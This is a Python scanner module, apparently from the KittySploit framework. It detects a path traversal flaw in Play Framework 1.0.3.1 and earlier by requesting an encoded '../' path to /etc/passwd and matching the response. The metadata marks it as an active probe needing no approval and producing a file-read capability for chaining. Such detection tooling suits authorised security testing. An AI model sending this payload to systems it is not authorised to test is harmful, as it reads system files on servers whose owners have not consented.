#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""Detects Play Framework <= 1."""

import re

from kittysploit import *
from lib.protocols.http.http_client import Http_client


class Module(Scanner, Http_client):
    __info__ = {
        'name': 'Play Framework - public Path Traversal Detection',
        'description': (
            'Detects Play Framework <= 1.0.3.1 LFI via /public/..%2f..%2f..%2fetc%2fpasswd.'
        ),
        'author': ['KittySploit Team'],
        'severity': 'high',
        'tags': ['web', 'scanner', 'play', 'lfi', 'unauth', 'vuln'],
        'agent': {
            'risk': 'active',
            'effects': ['network_probe'],
            'expected_requests': 1,
            'reversible': True,
            'approval_required': False,
            'produces': ['tech_hints', 'risk_signals', 'endpoints'],
            'cost': 1.0,
            'noise': 0.3,
            'value': 0.9,
            'requires': {
                'min_endpoints': 0, 'min_params': 0,
                'tech_hints_any': [], 'tech_hints_all': [],
                'specializations_any': [], 'risk_signals_any': [],
                'auth_session': False, 'capabilities_any': [], 'capabilities_all': [],
                'confidence_min': {}, 'confidence_min_any': {},
                'endpoint_pattern_any': [], 'param_any': [], 'api_surface_ready': False,
            },
            'chain': {
                'produces_capabilities': [{'capability': 'file_read', 'from_detail': ''}],
                'consumes_capabilities': [],
                'option_bindings': {},
                'suggested_followups': [],
            },
        },
        'references': [
            'https://www.securityfocus.com/bid/42340',
        ],
    }

    def run(self):
        path = '/public/' + ('..%2f' * 8) + 'etc%2fpasswd'
        r = self.http_request(method='GET', path=path, allow_redirects=False)
        if r and re.search(r'root:.*:0:[01]:', r.text or ''):
            self.set_info(severity='high', reason='Play Framework public path traversal', path='/public/')
            return True
        return False

